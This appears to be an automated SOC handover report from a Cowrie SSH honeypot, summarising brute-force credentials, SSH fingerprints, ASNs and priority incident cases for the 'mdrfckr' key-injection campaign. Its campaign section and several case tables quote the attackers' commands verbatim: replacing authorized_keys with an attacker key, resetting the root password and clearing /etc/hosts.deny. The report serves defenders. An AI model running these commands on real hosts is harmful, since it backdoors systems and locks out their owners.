# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-30 |
| **Generated At** | 2026-05-30T06:50:21Z |
| **Shift Time** | 06:50 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **206** |
| Confirmed Threats | **199** |
| False Positives Filtered | **7** (3.4%) |
| Unique Attacker IPs | **45** |
| Countries of Origin | **23** |
| High Severity Cases | **51** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **155** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **118** |
| Unique Credential Pairs | **69** |
| Unique Usernames | **44** |
| Unique Passwords | **62** |
| Successful Auth Pairs | **40** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 49 |
| `345gs5662d34` | 23 |
| `admin` | 2 |
| `a` | 2 |
| `nil` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 24 |
| `345gs5662d34` | 23 |
| `1234` | 3 |
| `123456` | 3 |
| `00998877` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 23 |
| `root` | `3245gs5662d34` | 23 |
| `root` | `00998877` | 2 |
| `root` | `computer` | 2 |
| `root` | `P@ssw0rd@2020` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `00998877` | `185.177.116.86` | 2026-05-30T04:29:07 |
| `root` | `3245gs5662d34` | `185.177.116.86` | 2026-05-30T04:29:10 |
| `root` | `Aaa123123` | `43.138.40.107` | 2026-05-30T04:29:37 |
| `root` | `3245gs5662d34` | `43.138.40.107` | 2026-05-30T04:29:41 |
| `root` | `Zz12345678` | `120.48.90.166` | 2026-05-30T04:32:27 |
| `root` | `00998877` | `194.87.97.159` | 2026-05-30T04:40:42 |
| `root` | `Root2026` | `194.87.97.159` | 2026-05-30T04:45:25 |
| `root` | `computer` | `79.36.191.212` | 2026-05-30T04:55:03 |
| `root` | `Root@123!` | `194.87.97.159` | 2026-05-30T04:55:06 |
| `root` | `3245gs5662d34` | `79.36.191.212` | 2026-05-30T04:55:06 |
| `root` | `3245gs5662d34` | `194.87.97.159` | 2026-05-30T04:55:17 |
| `root` | `P@ssw0rd@2020` | `37.143.61.4` | 2026-05-30T04:57:27 |
| `root` | `3245gs5662d34` | `37.143.61.4` | 2026-05-30T04:57:32 |
| `root` | `A123456..` | `197.199.224.52` | 2026-05-30T05:01:47 |
| `root` | `3245gs5662d34` | `197.199.224.52` | 2026-05-30T05:01:52 |
| `root` | `Qwerty2025` | `197.199.224.52` | 2026-05-30T05:09:41 |
| `root` | `10203040` | `112.119.21.245` | 2026-05-30T05:10:15 |
| `root` | `3245gs5662d34` | `112.119.21.245` | 2026-05-30T05:10:19 |
| `root` | `qwerty` | `197.199.224.52` | 2026-05-30T05:12:30 |
| `root` | `Zxcv!234` | `185.16.214.226` | 2026-05-30T05:14:48 |
| `root` | `3245gs5662d34` | `185.16.214.226` | 2026-05-30T05:14:52 |
| `root` | `xp` | `212.115.54.84` | 2026-05-30T05:17:50 |
| `root` | `3245gs5662d34` | `212.115.54.84` | 2026-05-30T05:17:53 |
| `root` | `Ck123456@` | `212.115.54.84` | 2026-05-30T05:18:45 |
| `root` | `abc@12345` | `212.115.54.84` | 2026-05-30T05:19:40 |
| `root` | `Admin123!` | `197.199.224.52` | 2026-05-30T05:19:53 |
| `root` | `225588` | `197.199.224.52` | 2026-05-30T05:21:23 |
| `root` | `qweASD123` | `103.12.135.35` | 2026-05-30T05:24:23 |
| `root` | `3245gs5662d34` | `103.12.135.35` | 2026-05-30T05:24:25 |
| `root` | `1Q2w3e4r` | `69.157.68.14` | 2026-05-30T05:25:55 |
| `root` | `3245gs5662d34` | `69.157.68.14` | 2026-05-30T05:26:01 |
| `root` | `1234@qwe` | `212.115.54.84` | 2026-05-30T05:26:50 |
| `root` | `P@ssw0rd@2020` | `212.115.54.84` | 2026-05-30T05:27:48 |
| `root` | `computer` | `212.115.54.84` | 2026-05-30T05:28:43 |
| `root` | `myfriend` | `186.31.95.163` | 2026-05-30T05:36:56 |
| `root` | `3245gs5662d34` | `186.31.95.163` | 2026-05-30T05:37:02 |
| `root` | `Pi123456@` | `186.31.95.163` | 2026-05-30T05:38:47 |
| `root` | `2004` | `186.31.95.163` | 2026-05-30T05:42:31 |
| `phil` | `phil123` | `186.31.95.163` | 2026-05-30T05:44:16 |
| `phil` | `3245gs5662d34` | `186.31.95.163` | 2026-05-30T05:44:23 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **206** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 116 |
| OpenSSH | 4 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 70 | 11 |
| `af8223ac9914...` | libssh-based | 28 | 2 |
| `03a80b21afa8...` | Modern SSH client | 16 | 4 |
| `c118de82e19e...` | Mirai/variant | 4 | 1 |
| `873a5fb5fedc...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 70 | 11 | Mirai/variant |
| `af8223ac9914...` | libssh | 28 | 2 | libssh-based |
| `03a80b21afa8...` | libssh | 16 | 4 | Modern SSH client |
| `c118de82e19e...` | OpenSSH | 4 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 2 | 2 | — |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 2 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 24 | 12 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:fMXKZIbcZVBw"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `120.48.90.166`, `194.87.97.159`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `185.177.116.86`, `43.138.40.107`, `212.115.54.84`, `186.31.95.163`, `194.87.97.159`, `37.143.61.4`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **45** |
| Unique ASNs | **34** |
| High-Risk ASNs | **28** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 4 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS211680` | NSEC - Sistemas Informaticos, S.A. | 3 | HIGH |
| `AS45090` | Shenzhen Tencent Computer Systems Company Limited | 3 | HIGH |
| `AS398324` | Censys, Inc. | 2 | HIGH |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 2 | HIGH |
| `AS36992` | ETISALAT MISR | 1 | HIGH |
| `AS61400` | Start2 LLC | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (51)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-70f2a66858cf

| Field | Detail |
|---|---|
| **Source IP** | `185.177.116[.]86` |
| **First Seen** | 2026-05-30 04:29 |
| **Last Seen** | 2026-05-30 04:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 04:29:06` | `cowrie.session.connect` |
| `2026-05-30 04:29:06` | `cowrie.client.version` |
| `2026-05-30 04:29:06` | `cowrie.client.kex` |
| `2026-05-30 04:29:07` | `cowrie.login.success` |
| `2026-05-30 04:29:07` | `cowrie.session.params` |
| `2026-05-30 04:29:07` | `cowrie.command.input` |
| `2026-05-30 04:29:07` | `cowrie.command.failed` |
| `2026-05-30 04:29:07` | `cowrie.log.closed` |
| `2026-05-30 04:29:08` | `cowrie.session.params` |
| `2026-05-30 04:29:08` | `cowrie.command.input` |
| `2026-05-30 04:29:08` | `cowrie.session.file_download` |
| `2026-05-30 04:29:08` | `cowrie.log.closed` |
| `2026-05-30 04:29:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.177.116[.]86` to AbuseIPDB if not already reported
- [ ] Block `185.177.116[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cc778b0efeb

| Field | Detail |
|---|---|
| **Source IP** | `185.177.116[.]86` |
| **First Seen** | 2026-05-30 04:29 |
| **Last Seen** | 2026-05-30 04:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 04:29:10` | `cowrie.session.connect` |
| `2026-05-30 04:29:10` | `cowrie.client.version` |
| `2026-05-30 04:29:10` | `cowrie.client.kex` |
| `2026-05-30 04:29:10` | `cowrie.login.success` |
| `2026-05-30 04:29:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.177.116[.]86` to AbuseIPDB if not already reported
- [ ] Block `185.177.116[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e5705f89311

| Field | Detail |
|---|---|
| **Source IP** | `43.138.40[.]107` |
| **First Seen** | 2026-05-30 04:29 |
| **Last Seen** | 2026-05-30 04:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 04:29:37` | `cowrie.session.connect` |
| `2026-05-30 04:29:37` | `cowrie.client.version` |
| `2026-05-30 04:29:37` | `cowrie.client.kex` |
| `2026-05-30 04:29:37` | `cowrie.login.success` |
| `2026-05-30 04:29:38` | `cowrie.session.params` |
| `2026-05-30 04:29:38` | `cowrie.command.input` |
| `2026-05-30 04:29:38` | `cowrie.command.failed` |
| `2026-05-30 04:29:38` | `cowrie.log.closed` |
| `2026-05-30 04:29:38` | `cowrie.session.params` |
| `2026-05-30 04:29:38` | `cowrie.command.input` |
| `2026-05-30 04:29:38` | `cowrie.session.file_download` |
| `2026-05-30 04:29:38` | `cowrie.log.closed` |
| `2026-05-30 04:29:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.138.40[.]107` to AbuseIPDB if not already reported
- [ ] Block `43.138.40[.]107` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95e3b9dd0dc5

| Field | Detail |
|---|---|
| **Source IP** | `43.138.40[.]107` |
| **First Seen** | 2026-05-30 04:29 |
| **Last Seen** | 2026-05-30 04:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 04:29:41` | `cowrie.session.connect` |
| `2026-05-30 04:29:41` | `cowrie.client.version` |
| `2026-05-30 04:29:41` | `cowrie.client.kex` |
| `2026-05-30 04:29:41` | `cowrie.login.success` |
| `2026-05-30 04:29:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.138.40[.]107` to AbuseIPDB if not already reported
- [ ] Block `43.138.40[.]107` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-333c739d4552

| Field | Detail |
|---|---|
| **Source IP** | `120.48.90[.]166` |
| **First Seen** | 2026-05-30 04:32 |
| **Last Seen** | 2026-05-30 04:33 |
| **Session Duration** | 101s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:fMXKZIbcZVBw"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 04:32:15` | `cowrie.session.connect` |
| `2026-05-30 04:32:15` | `cowrie.client.version` |
| `2026-05-30 04:32:16` | `cowrie.client.kex` |
| `2026-05-30 04:32:27` | `cowrie.login.success` |
| `2026-05-30 04:32:29` | `cowrie.session.params` |
| `2026-05-30 04:32:29` | `cowrie.command.input` |
| `2026-05-30 04:32:29` | `cowrie.command.failed` |
| `2026-05-30 04:32:30` | `cowrie.log.closed` |
| `2026-05-30 04:32:30` | `cowrie.session.params` |
| `2026-05-30 04:32:30` | `cowrie.command.input` |
| `2026-05-30 04:32:44` | `cowrie.session.file_download` |
| `2026-05-30 04:32:44` | `cowrie.log.closed` |
| `2026-05-30 04:33:13` | `cowrie.session.params` |
| `2026-05-30 04:33:13` | `cowrie.command.input` |
| `2026-05-30 04:33:13` | `cowrie.log.closed` |
| `2026-05-30 04:33:14` | `cowrie.session.params` |
| `2026-05-30 04:33:14` | `cowrie.command.input` |
| `2026-05-30 04:33:15` | `cowrie.log.closed` |
| `2026-05-30 04:33:15` | `cowrie.session.params` |
| `2026-05-30 04:33:15` | `cowrie.command.input` |
| `2026-05-30 04:33:17` | `cowrie.session.file_download` |
| `2026-05-30 04:33:17` | `cowrie.log.closed` |
| `2026-05-30 04:33:18` | `cowrie.session.params` |
| `2026-05-30 04:33:18` | `cowrie.command.input` |
| `2026-05-30 04:33:20` | `cowrie.log.closed` |
| `2026-05-30 04:33:24` | `cowrie.session.params` |
| `2026-05-30 04:33:24` | `cowrie.command.input` |
| `2026-05-30 04:33:24` | `cowrie.log.closed` |
| `2026-05-30 04:33:25` | `cowrie.session.params` |
| `2026-05-30 04:33:25` | `cowrie.command.input` |
| `2026-05-30 04:33:25` | `cowrie.command.input` |
| `2026-05-30 04:33:26` | `cowrie.log.closed` |
| `2026-05-30 04:33:28` | `cowrie.session.params` |
| `2026-05-30 04:33:28` | `cowrie.command.input` |
| `2026-05-30 04:33:28` | `cowrie.log.closed` |
| `2026-05-30 04:33:28` | `cowrie.session.params` |
| `2026-05-30 04:33:28` | `cowrie.command.input` |
| `2026-05-30 04:33:30` | `cowrie.log.closed` |
| `2026-05-30 04:33:31` | `cowrie.session.params` |
| `2026-05-30 04:33:31` | `cowrie.command.input` |
| `2026-05-30 04:33:34` | `cowrie.log.closed` |
| `2026-05-30 04:33:34` | `cowrie.session.params` |
| `2026-05-30 04:33:34` | `cowrie.command.input` |
| `2026-05-30 04:33:35` | `cowrie.log.closed` |
| `2026-05-30 04:33:35` | `cowrie.session.params` |
| `2026-05-30 04:33:35` | `cowrie.command.input` |
| `2026-05-30 04:33:46` | `cowrie.log.closed` |
| `2026-05-30 04:33:49` | `cowrie.session.params` |
| `2026-05-30 04:33:49` | `cowrie.command.input` |
| `2026-05-30 04:33:50` | `cowrie.log.closed` |
| `2026-05-30 04:33:51` | `cowrie.session.params` |
| `2026-05-30 04:33:51` | `cowrie.command.input` |
| `2026-05-30 04:33:52` | `cowrie.log.closed` |
| `2026-05-30 04:33:52` | `cowrie.session.params` |
| `2026-05-30 04:33:52` | `cowrie.command.input` |
| `2026-05-30 04:33:54` | `cowrie.log.closed` |
| `2026-05-30 04:33:54` | `cowrie.session.params` |
| `2026-05-30 04:33:54` | `cowrie.command.input` |
| `2026-05-30 04:33:54` | `cowrie.log.closed` |
| `2026-05-30 04:33:55` | `cowrie.session.params` |
| `2026-05-30 04:33:55` | `cowrie.command.input` |
| `2026-05-30 04:33:57` | `cowrie.log.closed` |
| `2026-05-30 04:33:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.90[.]166` to AbuseIPDB if not already reported
- [ ] Block `120.48.90[.]166` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91be888b0e59

| Field | Detail |
|---|---|
| **Source IP** | `194.87.97[.]159` |
| **First Seen** | 2026-05-30 04:40 |
| **Last Seen** | 2026-05-30 04:40 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:pS3mnjMthv94"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 04:40:41` | `cowrie.session.connect` |
| `2026-05-30 04:40:41` | `cowrie.client.version` |
| `2026-05-30 04:40:42` | `cowrie.client.kex` |
| `2026-05-30 04:40:42` | `cowrie.login.success` |
| `2026-05-30 04:40:42` | `cowrie.session.params` |
| `2026-05-30 04:40:42` | `cowrie.command.input` |
| `2026-05-30 04:40:42` | `cowrie.command.failed` |
| `2026-05-30 04:40:43` | `cowrie.log.closed` |
| `2026-05-30 04:40:43` | `cowrie.session.params` |
| `2026-05-30 04:40:43` | `cowrie.command.input` |
| `2026-05-30 04:40:43` | `cowrie.session.file_download` |
| `2026-05-30 04:40:43` | `cowrie.log.closed` |
| `2026-05-30 04:40:51` | `cowrie.session.params` |
| `2026-05-30 04:40:51` | `cowrie.command.input` |
| `2026-05-30 04:40:51` | `cowrie.log.closed` |
| `2026-05-30 04:40:52` | `cowrie.session.params` |
| `2026-05-30 04:40:52` | `cowrie.command.input` |
| `2026-05-30 04:40:52` | `cowrie.log.closed` |
| `2026-05-30 04:40:52` | `cowrie.session.params` |
| `2026-05-30 04:40:52` | `cowrie.command.input` |
| `2026-05-30 04:40:52` | `cowrie.session.file_download` |
| `2026-05-30 04:40:52` | `cowrie.log.closed` |
| `2026-05-30 04:40:52` | `cowrie.session.params` |
| `2026-05-30 04:40:52` | `cowrie.command.input` |
| `2026-05-30 04:40:53` | `cowrie.log.closed` |
| `2026-05-30 04:40:53` | `cowrie.session.params` |
| `2026-05-30 04:40:53` | `cowrie.command.input` |
| `2026-05-30 04:40:53` | `cowrie.log.closed` |
| `2026-05-30 04:40:53` | `cowrie.session.params` |
| `2026-05-30 04:40:53` | `cowrie.command.input` |
| `2026-05-30 04:40:53` | `cowrie.command.input` |
| `2026-05-30 04:40:53` | `cowrie.log.closed` |
| `2026-05-30 04:40:54` | `cowrie.session.params` |
| `2026-05-30 04:40:54` | `cowrie.command.input` |
| `2026-05-30 04:40:54` | `cowrie.log.closed` |
| `2026-05-30 04:40:54` | `cowrie.session.params` |
| `2026-05-30 04:40:54` | `cowrie.command.input` |
| `2026-05-30 04:40:54` | `cowrie.log.closed` |
| `2026-05-30 04:40:55` | `cowrie.session.params` |
| `2026-05-30 04:40:55` | `cowrie.command.input` |
| `2026-05-30 04:40:55` | `cowrie.log.closed` |
| `2026-05-30 04:40:55` | `cowrie.session.params` |
| `2026-05-30 04:40:55` | `cowrie.command.input` |
| `2026-05-30 04:40:55` | `cowrie.log.closed` |
| `2026-05-30 04:40:55` | `cowrie.session.params` |
| `2026-05-30 04:40:55` | `cowrie.command.input` |
| `2026-05-30 04:40:56` | `cowrie.log.closed` |
| `2026-05-30 04:40:56` | `cowrie.session.params` |
| `2026-05-30 04:40:56` | `cowrie.command.input` |
| `2026-05-30 04:40:56` | `cowrie.log.closed` |
| `2026-05-30 04:40:56` | `cowrie.session.params` |
| `2026-05-30 04:40:56` | `cowrie.command.input` |
| `2026-05-30 04:40:56` | `cowrie.log.closed` |
| `2026-05-30 04:40:57` | `cowrie.session.params` |
| `2026-05-30 04:40:57` | `cowrie.command.input` |
| `2026-05-30 04:40:57` | `cowrie.log.closed` |
| `2026-05-30 04:40:57` | `cowrie.session.params` |
| `2026-05-30 04:40:57` | `cowrie.command.input` |
| `2026-05-30 04:40:57` | `cowrie.log.closed` |
| `2026-05-30 04:40:58` | `cowrie.session.params` |
| `2026-05-30 04:40:58` | `cowrie.command.input` |
| `2026-05-30 04:40:58` | `cowrie.log.closed` |
| `2026-05-30 04:40:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.87.97[.]159` to AbuseIPDB if not already reported
- [ ] Block `194.87.97[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6353bcc882d

| Field | Detail |
|---|---|
| **Source IP** | `194.87.97[.]159` |
| **First Seen** | 2026-05-30 04:45 |
| **Last Seen** | 2026-05-30 04:45 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
